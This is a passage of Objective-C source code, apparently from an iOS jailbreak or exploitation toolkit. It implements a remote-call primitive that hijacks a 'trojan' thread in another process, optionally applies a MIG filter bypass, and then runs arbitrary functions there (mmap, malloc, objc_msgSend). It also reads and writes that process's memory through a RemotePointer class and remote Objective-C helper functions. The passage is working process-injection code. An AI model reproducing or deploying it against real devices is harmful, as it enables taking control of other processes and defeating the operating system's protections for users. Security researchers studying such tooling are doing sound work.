            if (useMigFilterBypass) mig_bypass_pause();
            [self destroyRemoteCall];
            return -1;
        }
    }

    if (useMigFilterBypass) mig_bypass_pause();

    uint64_t ret = RemoteArbCallTempWithTimeout(100, self, thread_resume, callThreadPort);
    if (ret != 0) {
        _creatingExtraThread = false;
    } else {
        _creatingExtraThread = true;
    }

    if (_creatingExtraThread) {
        [self restoreTrojanThreadWithState:&_originalState];
        _trojanThreadAddr = _callThreadAddr;
    }

    _pid = (int)RemoteArbCallWithTimeout(100, self, getpid);
    printf("(rc) Task pid: %d\n", _pid);
    if (_pid <= 0) {
        [self destroyRemoteCall];
        return -1;
    }

    _trojanMem = RemoteArbCallWithTimeout(100, self, mmap, 0, PAGE_SIZE,
        VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0);
    if (!_trojanMem || _trojanMem == UINT64_MAX) {
        _trojanMem = 0;
        [self destroyRemoteCall];
        return -1;
    }

    RemoteArbCallWithTimeout(100, self, memset, _trojanMem, 0, PAGE_SIZE);

    _success = true;
    printf("(rc) Finished successfully\n");
    return 0;
}

- (instancetype)initWithProcess:(NSString *)process useMigFilterBypass:(BOOL)useMigFilterBypass {
    self = [super init];
    g_rc_last_init_error = nil;
    self.lastError = nil;
    int rc;
    @try {
        rc = [self initRemoteCallForProcess:process.UTF8String useMigFilterBypass:useMigFilterBypass];
    } @catch (NSException *exception) {
        NSLog(@"(rc) initRemoteCallForProcess failed: %@", exception);
        g_rc_last_init_error = exception.description;
        return nil;
    }
    if (rc) {
        g_rc_last_init_error = self.lastError ?: @"RemoteCall init failed";
        return nil;
    }
    return self;
}

- (RemotePointer *)objectAtIndexedSubscript:(uint64_t)address {
    return [[RemotePointer alloc] initWithRemoteCall:self address:address];
}

@end

// ============================================================
// RemotePointer
// ============================================================

@implementation RemotePointer
- (instancetype)initWithRemoteCall:(RemoteCall *)remoteCall address:(NSUInteger)address {
    self = [super init];
    _remoteCall = remoteCall;
    _address = address;
    return self;
}

- (void)setString:(NSString *)string { [self.remoteCall remote_write:_address string:string.UTF8String]; }
- (void)setValue8:(uint8_t)val    { [self.remoteCall remote_write:_address from:&val size:sizeof(val)]; }
- (void)setValue16:(uint16_t)val  { [self.remoteCall remote_write:_address from:&val size:sizeof(val)]; }
- (void)setValue32:(uint32_t)val  { [self.remoteCall remote_write:_address from:&val size:sizeof(val)]; }
- (void)setValue64:(uint64_t)val  { [self.remoteCall remote_write:_address from:&val size:sizeof(val)]; }
- (void)setValueDouble:(CGFloat)val { [self.remoteCall remote_write:_address from:&val size:sizeof(val)]; }

- (NSString *)string {
    size_t len = RemoteArbCall(self.remoteCall, strlen, _address);
    char *buf = malloc(len + 1);
    if (!buf) return nil;
    [self.remoteCall remoteRead:_address to:buf size:len];
    buf[len] = '\0';
    NSString *result = @(buf);
    free(buf);
    return result;
}
- (uint8_t)value8   { uint8_t v = 0;  [self.remoteCall remoteRead:_address to:&v size:sizeof(v)]; return v; }
- (uint16_t)value16 { uint16_t v = 0; [self.remoteCall remoteRead:_address to:&v size:sizeof(v)]; return v; }
- (uint32_t)value32 { uint32_t v = 0; [self.remoteCall remoteRead:_address to:&v size:sizeof(v)]; return v; }
- (uint64_t)value64 { uint64_t v = 0; [self.remoteCall remoteRead:_address to:&v size:sizeof(v)]; return v; }
- (CGFloat)valueDouble { CGFloat v = 0; [self.remoteCall remoteRead:_address to:&v size:sizeof(v)]; return v; }
@end

// ============================================================
// RemoteCall helper functions (remote_sel, remote_msg, ...)
// ============================================================

uint64_t remote_alloc_str(RemoteCall *proc, const char *str) {
    uint64_t len = strlen(str) + 1;
    uint64_t buf = RemoteArbCall(proc, malloc, len);
    if (buf) proc[buf].string = @(str);
    return buf;
}

uint64_t remote_sel(RemoteCall *proc, const char *name) {
    uint64_t str = remote_alloc_str(proc, name);
    uint64_t sel = RemoteArbCall(proc, sel_registerName, str);
    RemoteArbCall(proc, free, str);
    return sel;
}

uint64_t remote_getClass(RemoteCall *proc, const char *name) {
    uint64_t str = remote_alloc_str(proc, name);
    uint64_t cls = RemoteArbCall(proc, objc_getClass, str);
    RemoteArbCall(proc, free, str);
    return cls;
}

uint64_t remote_msg(RemoteCall *proc, uint64_t obj, uint64_t sel,
    uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3)
{
    return RemoteArbCall(proc, objc_msgSend, obj, sel, a0, a1, a2, a3);
}

int remote_errno(RemoteCall *proc) {
    uint64_t errPtr = RemoteArbCall(proc, __error);
    if (!errPtr) return -1;
    return proc[errPtr].value32;
}

uint64_t remote_NSString(RemoteCall *proc, const char *str) {
    uint64_t sel_stringWithCString = remote_sel(proc, "stringWithCString:");
    uint64_t cls_NSString = remote_getClass(proc, "NSString");
    uint64_t resultCStr = remote_alloc_str(proc, str);
    uint64_t result = remote_msg(proc, cls_NSString, sel_stringWithCString, resultCStr, 0, 0, 0);
    RemoteArbCall(proc, free, resultCStr);
    return result;
}

CGRect remote_getCGRect(RemoteCall *proc, uint64_t obj, uint64_t sel) {
    remote_msg(proc, obj, sel, 0,0,0,0);
    uint64_t where = proc.trojanMem;
    Class class = NSClassFromString(@"CAMetalDrawable");
    Method method = class_getInstanceMethod(class, @selector(setDirtyRect:));
    void *setDoubleRegistersImp = method_getImplementation(method);
    RemoteArbCall(proc, setDoubleRegistersImp, where-0x20);
    CGRect result;
    [proc remoteRead:where to:&result size:sizeof(result)];
    return result;
}

void remote_setCGRect(RemoteCall *proc, uint64_t obj, uint64_t sel, CGRect newRect) {
    uint64_t where = proc.trojanMem;
    [proc remote_write:where from:&newRect size:sizeof(newRect)];
    Class class = NSClassFromString(@"CAMetalDrawable");
    Method method = class_getInstanceMethod(class, @selector(dirtyRect));
    void *setDoubleRegistersImp = method_getImplementation(method);
    RemoteArbCall(proc, setDoubleRegistersImp, where-0x20);
    remote_msg(proc, obj, sel, 0,0,0,0);
}